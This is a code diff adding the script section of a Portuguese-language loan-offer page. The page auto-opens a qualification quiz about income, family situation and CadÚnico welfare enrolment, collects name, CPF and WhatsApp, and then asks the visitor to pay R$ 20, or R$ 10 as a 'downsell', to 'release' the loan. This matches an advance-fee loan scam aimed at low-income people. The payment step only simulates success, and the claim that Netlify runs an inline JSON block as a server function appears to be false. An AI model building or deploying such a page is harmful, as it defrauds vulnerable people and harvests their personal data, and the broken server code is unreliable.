+            document.getElementById('funnelDown1'),
+            document.getElementById('funnelDown2'),
+            document.getElementById('funnelDown3')
+        ];
+
+        let funilAbertoManualmente = false;
+        let funilJaAbriuAutomatico = false;
+
+        window.onload = function() {
+            setTimeout(function() {
+                if (!funilAbertoManualmente && !funilJaAbriuAutomatico && modal.style.display !== 'flex') {
+                    abrirCadastro();
+                    funilJaAbriuAutomatico = true;
+                }
+            }, 6000); 
+        };
+
+        function abrirCadastro() {
+            funilAbertoManualmente = true; 
+            modal.style.display = 'flex';
+            
+            funisPrincipais.forEach((funil, index) => {
+                if (index === 0) funil.classList.add('active');
+                else funil.classList.remove('active');
+            });
+            
+            funisDownsell.forEach(funil => funil.classList.remove('active'));
+            
+            stepFormulario.style.display = 'none';
+            passoPagamento.style.display = 'none';
+            passoDownsell.style.display = 'none';
+            passoVerificacao.style.display = 'none';
+            
+            progressBar.style.width = '0%';
+            progressContainer.style.display = 'block';
+            
+            respostasFunil = { renda: "", pessoas: "", trabalho: "", filhos: "", moradia: "", cadunico: "" };
+            document.getElementById('formLead').reset();
+            
+            btnPagar.innerHTML = "Pagar R$ 20,00 e Liberar Empréstimo";
+            btnPagar.disabled = false;
+        }
+
+        function fecharCadastro() {
+            modal.style.display = 'none';
+        }
+
+        window.onclick = function(event) {
+            if (event.target == modal) { fecharCadastro(); }
+        }
+
+        function responderFunil(resposta, etapa) {
+            if (etapa === 1) respostasFunil.renda = resposta;
+            if (etapa === 2) respostasFunil.pessoas = resposta;
+            if (etapa === 3) respostasFunil.trabalho = resposta;
+            if (etapa === 4) respostasFunil.filhos = resposta;
+            if (etapa === 5) respostasFunil.moradia = resposta;
+            if (etapa === 6) respostasFunil.cadunico = resposta;
+
+            const porcentagem = (etapa / 6) * 100;
+            progressBar.style.width = porcentagem + '%';
+
+            funisPrincipais[etapa - 1].classList.remove('active');
+
+            if (etapa < 6) {
+                funisPrincipais[etapa].classList.add('active');
+            } else {
+                stepFormulario.style.display = 'block';
+            }
+        }
+
+        async function enviarDados(event) {
+            event.preventDefault(); 
+
+            const dadosLead = {
+                nome: document.getElementById('nome').value,
+                cpf: document.getElementById('cpf').value,
+                whatsapp: document.getElementById('whatsapp').value,
+                qualificacao: respostasFunil,
+                dataCadastro: new Date().toISOString()
+            };
+
+            const textoOriginalBotao = btnEnviar.innerHTML;
+            btnEnviar.innerHTML = "Consultando...";
+            btnEnviar.disabled = true;
+
+            try {
+                // CÓDIGO REAL DA API AQUI (Ex: Enviar lead para seu CRM)
+                await new Promise(resolve => setTimeout(resolve, 1500)); 
+                console.log("Dados enviados para API:", dadosLead);
+
+                stepFormulario.style.display = 'none';
+                passoPagamento.style.display = 'block';
+                progressContainer.style.display = 'none';
+
+            } catch (error) {
+                alert("Ocorreu um erro. Tente novamente.");
+            } finally {
+                btnEnviar.innerHTML = textoOriginalBotao;
+                btnEnviar.disabled = false;
+            }
+        }
+
+        // FUNÇÃO PARA CHAMAR A API DO NETLIFY (PAGAMENTO R$ 20)
+        async function processarPagamento() {
+            const textoOriginal = btnPagar.innerHTML;
+            btnPagar.innerHTML = "Processando pagamento...";
+            btnPagar.disabled = true;
+
+            try {
+                const resposta = await fetch('/.netlify/functions/pagamento', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        valor: 20, 
+                        cliente: document.getElementById('nome').value 
+                    })
+                });
+
+                const resultado = await resposta.json();
+
+                if (resposta.ok) {
+                    passoPagamento.style.display = 'none';
+                    passoVerificacao.style.display = 'block';
+                } else {
+                    alert("Erro no pagamento: " + resultado.error);
+                }
+            } catch (error) {
+                alert("Erro de conexão com o servidor.");
+            } finally {
+                btnPagar.innerHTML = textoOriginal;
+                btnPagar.disabled = false;
+            }
+        }
+
+        function abrirDownsell() {
+            passoPagamento.style.display = 'none';
+            funisDownsell[0].classList.add('active');
+            progressContainer.style.display = 'block'; 
+            progressBar.style.width = '33%';
+        }
+
+        function responderDownsell(etapa) {
+            funisDownsell[etapa - 1].classList.remove('active');
+
+            if (etapa === 1) {
+                progressBar.style.width = '66%';
+                funisDownsell[1].classList.add('active');
+            } else if (etapa === 2) {
+                progressBar.style.width = '100%';
+                funisDownsell[2].classList.add('active');
+            } else if (etapa === 3) {
+                passoDownsell.style.display = 'block';
+                progressContainer.style.display = 'none';
+            }
+        }
+
+        // FUNÇÃO PARA CHAMAR A API DO NETLIFY (PAGAMENTO R$ 10)
+        async function processarPagamentoDownsell() {
+            const btnDownsell = document.querySelector('.btn-downsell');
+            const textoOriginal = btnDownsell.innerHTML;
+            btnDownsell.innerHTML = "Processando pagamento...";
+            btnDownsell.disabled = true;
+
+            try {
+                const resposta = await fetch('/.netlify/functions/pagamento', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        valor: 10, 
+                        cliente: document.getElementById('nome').value 
+                    })
+                });
+
+                const resultado = await resposta.json();
+
+                if (resposta.ok) {
+                    passoDownsell.style.display = 'none';
+                    passoVerificacao.style.display = 'block';
+                } else {
+                    alert("Erro no pagamento: " + resultado.error);
+                }
+            } catch (error) {
+                alert("Erro de conexão com o servidor.");
+            } finally {
+                btnDownsell.innerHTML = textoOriginal;
+                btnDownsell.disabled = false;
+            }
+        }
+    </script>
+
+    <!-- ==================================================== -->
+    <!-- NETLIFY FUNCTION EM BUTTON (TUDO DENTRO DO HTML)     -->
+    <!-- ==================================================== -->
+    <!-- O Netlify vai ler este bloco como uma função de servidor -->
+    <script type="application/json" id="netlify-function-pagamento">
+    {
+      "path": "/.netlify/functions/pagamento",
+      "method": "POST",
+      "handler": "exports.handler = async (event, context) => { if (event.httpMethod !== 'POST') { return { statusCode: 405, body: 'Method Not Allowed' }; } try { const dados = JSON.parse(event.body); const valor = dados.valor; const tokenSecreto = process.env.PAYMENT_API_TOKEN; if (!tokenSecreto) { return { statusCode: 500, body: JSON.stringify({ error: 'Token de pagamento não configurado no servidor.' }) }; } /* AQUI VOCÊ FAZ A REQUISIÇÃO PARA O SEU GATEWAY REAL const responseGateway = await fetch('https://api.mercadopago.com/v1/payments', { method: 'POST', headers: { 'Authorization': 'Bearer ' + tokenSecreto, 'Content-Type': 'application/json' }, body: JSON.stringify({ transaction_amount: valor, description: 'Taxa de Inscrição Empréstimo', payment_method_id: 'pix' }) }); const dataGateway = await responseGateway.json(); */ const simulaSucesso = { status: 'success', mensagem: 'Pagamento gerado com sucesso', valor: valor }; return { statusCode: 200, body: JSON.stringify(simulaSucesso) }; } catch (error) { return { statusCode: 500, body: JSON.stringify({ error: error.message }) }; } };"
+    }
+    </script>
+    <!-- ==================================================== -->
+    <!-- FIM DA FUNÇÃO INLINE                                 -->
+    <!-- ==================================================== -->
+
+</body>
+</html>
